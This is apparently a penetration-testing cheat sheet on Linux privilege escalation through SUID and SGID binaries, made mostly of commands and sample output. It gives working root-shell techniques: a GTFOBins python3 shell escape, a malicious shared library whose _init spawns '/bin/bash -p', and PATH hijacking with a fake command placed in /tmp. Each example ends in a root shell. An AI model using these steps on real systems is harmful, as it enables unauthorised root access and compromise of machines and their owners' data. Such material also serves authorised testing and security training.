# SUID / SGID BINARIES

### Find SUID binaries

```bash
find / -perm -4000 -type f 2>/dev/null
```

> Binaries that run as owner (often root)

**Why:** Custom/unusual SUID = exploit

<details>
<summary>Example Output</summary>

```
find / -perm -4000 2>/dev/null
/usr/bin/sudo
/usr/bin/passwd
/usr/bin/pkexec     <- PwnKit!
/opt/custom_app     <- non-standard SUID!
(Focus on non-standard binaries)
```
</details>

---

### Find SGID binaries

```bash
find / -perm -2000 -type f 2>/dev/null
```

> Binaries that run as group

**Why:** Less common but still useful

<details>
<summary>Example Output</summary>

```
find / -perm -2000 -type f 2>/dev/null
/usr/bin/wall
/usr/bin/crontab
/opt/custom_tool  <- non-standard!
(SGID runs as group owner, check for abuse)
```
</details>

---

### GTFOBins SUID lookup

```bash
Search each unusual SUID binary on GTFOBins
```

> Known SUID abuses

**Why:** Ignore standard ones like sudo, passwd

<details>
<summary>Example Output</summary>

```
SUID: /usr/bin/python3

GTFOBins SUID section:
python3 -c 'import os; os.execl("/bin/sh", "sh", "-p")'

# whoami
root
(SUID python = instant root)
```
</details>

---

### SUID shared library hijack

```bash
strace <suid_binary> 2>&1 | grep 'No such file'
Create missing .so with malicious code
```

> If SUID binary loads missing library

**Why:** Write library to writable path

<details>
<summary>Example Output</summary>

```
strace /opt/custom_suid 2>&1 | grep 'No such file'
open("/tmp/libcustom.so", O_RDONLY) = -1 ENOENT

Compile malicious libcustom.so:
#include<stdlib.h>
void _init(){ system("/bin/bash -p"); }

gcc -shared -fPIC -o /tmp/libcustom.so lib.c
/opt/custom_suid
# whoami
root
```
</details>

---

### SUID PATH abuse

```bash
If SUID binary calls commands without full path:
echo '/bin/bash' > /tmp/command
chmod +x /tmp/command
PATH=/tmp:$PATH <suid_binary>
```

> Hijack relative command calls

**Why:** Binary runs your fake command as root

<details>
<summary>Example Output</summary>

```
/opt/custom_app calls 'service apache2 start' without full path

echo '/bin/bash -p' > /tmp/service
chmod +x /tmp/service
PATH=/tmp:$PATH /opt/custom_app

# whoami
root
```
</details>

---

### SUID binary version exploits

```bash
Check version of each SUID binary
```

> Outdated binaries with CVEs

**Why:** Especially custom compiled ones

<details>
<summary>Example Output</summary>

```
/opt/custom_v1.2 has SUID
Google: 'custom_app v1.2 exploit'
Exploit-DB: Buffer overflow in v1.2
(Custom compiled SUID binaries are prime targets)
```
</details>

---
